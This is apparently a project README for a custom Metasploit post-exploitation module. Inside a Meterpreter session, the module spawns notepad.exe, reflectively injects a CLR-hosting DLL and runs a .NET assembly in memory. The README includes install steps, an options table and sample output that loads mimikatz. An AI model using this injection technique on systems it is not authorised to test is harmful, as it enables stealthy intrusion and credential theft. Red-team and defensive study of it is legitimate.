# Execute assembly via Meterpreter session

This is a custom Metasploit post module to executing a .NET Assembly from Meterpreter session

This project target

Windows 10 64bit<br />
.Net 4.0<br />
Metasploit Framework 4<br />

It spawn a notepad.exe process and use Reflective dll injection to load HostingCLRx64.dll needed to run .Net assembly

You'll find details at [Execute assembly via Meterpreter session](https://b4rtik.blogspot.com/2018/12/execute-assembly-via-meterpreter-session.html)

## Install

Create $HOME/.msf4/modules/post/windows/manage<br />
Copy execute-assembly.rb in $HOME/.msf4/modules/post/windows/manage/<br />
Create $HOME-METASPLOIT-DATADIR/execute-assembly<br />
Copy HostingCLRx64.dll in $HOME-METASPLOIT-DATADIR/execute-assembly/<br /> 

## Note

The signature of the Main method must match with the parameters that have been set in the module, for example:

If the property ARGUMENTS is set to "antani sblinda destra" the main method should be "static void main (string [] args)"<br />
If the property ARGUMENTS is set to "" the main method should be "static void main ()"

## Module options and execution

```
msf post(windows/manage/execute-assembly) > options 

Module options (post/windows/manage/execute-assembly):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   ARGUMENTS                      no        Command line arguments
   ASSEMBLY                       yes       Assembly file name
   ASSEMBLYPATH                   no        Assembly directory
   SESSION                        yes       The session to run this module on.
   WAIT          10               no        Time in seconds to wait

msf post(windows/manage/execute-assembly) > 
```

```
msf post(windows/manage/execute-assembly) > exploit 

[*] Launching notepad to host CLR...
[+] Process 4708 launched.
[*] Reflectively injecting the Host DLL into 4708...
[*] Injecting Host into 4708...
[*] Host injected. Copy assembly into 4708...
[*] Assembly copied. Executing...
[*] Start reading output
[+] 
[+]   .#####.   mimikatz 2.1.1 (x64) built on Oct 22 2018 16:32:27
[+]  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
[+]  ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
[+]  ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
[+]  '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
[+]   '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
[+] 
[+] mimikatz(powershell) # coffee
[+] 
[+]     ( (
[+]      ) )
[+]   .______.
[+]   |      |]
[+]   \      /
[+]    `----'
[+] 
[*] End output.
[+] Killing process 4708
[+] Execution finished.
[*] Post module execution completed
msf post(windows/manage/execute-assembly) >
```
